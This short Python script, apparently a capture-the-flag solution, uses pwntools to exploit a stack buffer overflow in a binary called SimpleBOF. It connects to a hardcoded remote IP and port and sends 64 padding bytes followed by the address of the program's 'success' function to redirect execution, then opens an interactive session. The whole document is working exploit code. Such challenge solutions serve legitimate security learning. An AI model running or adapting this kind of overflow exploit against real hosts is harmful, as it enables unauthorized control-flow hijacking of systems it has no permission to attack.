#!/usr/bin/env python

from pwn import *

e = ELF("./SimpleBOF")
p = remote("159.65.13.76", 63001)

offset = 64
success_addr = e.sym["success"]

payload = 'A'*offset + p32(success_addr)

p.sendline(payload)
p.interactive()
